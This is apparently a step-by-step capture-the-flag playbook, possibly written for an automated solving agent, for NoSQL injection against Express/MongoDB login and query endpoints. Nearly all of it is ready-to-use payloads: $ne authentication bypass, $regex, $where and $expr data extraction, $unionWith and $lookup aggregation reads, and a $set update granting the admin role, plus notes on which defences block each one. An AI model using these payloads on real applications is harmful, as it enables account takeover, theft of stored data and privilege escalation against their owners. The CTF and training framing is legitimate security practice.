# Field manual — the NoSQLi session in order

## Minute 0 — the stack-check

```bash
curl -sI http://t/ | grep -iE "server|x-powered"
```

`X-Powered-By: Express` + `mongoose`/`mongodb` dep → NoSQL stack —
`whitebox-hunt.md`.

## Minute 2 — the carrier-probe

```text
POST {"user":"x","pass":"y"}           → JSON?
POST user=x&pass=y                     → form?
POST user[$ne]=x&pass[$ne]=x           → qs?
GET  ?filter[user][$ne]=x              → query?
```

`injection-points.md`.

## Minute 4 — the differential

```text
control:  {"user":"nosuch","pass":"x"}       → 401 / {"users":[]}
probe:    {"user":{"$ne":null},"pass":{"$ne":null}} → 200 / {"users":[...]}?
```

`detection.md` — the object-vs-scalar.

## Minute 6 — the `nosqli_probe` matrix

```bash
python3 tools/web/nosqli_probe.py --url "http://t/login" --json \
  --user-field user --pass-field pass \
  --good-user test --good-pass test
```

`tooling.md`.

## Minute 10 — the auth-bypass

```json
{"user":{"$ne":null},"pass":{"$ne":null}}  → 302/token?
{"user":"admin","pass":{"$ne":null}}       → admin?
```

`auth-bypass.md` — then prove via a read endpoint.

## Minute 15 — the extraction

```json
{"pass":{"$regex":"^a"}}
{"pass":{"$regex":"^.{20}$"}}
{"flag":{"$regex":"^flag\\{"}}
{"$expr":{"$eq":[{"$substrCP":["$p",0,4]},"flag"]}}
{"user":{"$where":"this.pass[0]=='f'"}}
```

`extraction.md` / `extraction-deep.md` / `flag-extraction.md`.

## Minute 25 — the aggregation

```json
[{"$unionWith":"flag"}]
[{"$lookup":{"from":"flag",...}}]
```

`aggregation.md`.

## Minute 30 — the update

```json
{"$set":{"role":"admin"}}
```

`update-injection.md` — only on solver-created objects.

## Minute 35 — the flag

```bash
python3 tools/hooks.py pre-flag <name> --value "flag{...}" \
  --source "response" --evidence "<excerpt>"
```

`evidence-rules.md`.

## The falsifiers — when each dies

| Denied | Symptom | Open |
|---|---|---|
| `String()` | `"[object Object]"` | `denied-conditions.md` |
| `sanitizeFilter` | `$` stripped | `filter-bypass.md` |
| `extended:false` | flat parser | `injection-points.md` |
| `enableJs:false` | `$where` dead | `operators-js.md` |
| CastError | schema-typed | `mongo-specific.md` |
| no collection | empty not error | `aggregation.md` |

## The escalation

```text
chain_match → reclassify → writeup_search → novel_plan → fanout_sweep → solver_handoff
```

`AGENTS.md` — 5/15/25/45 budgets.
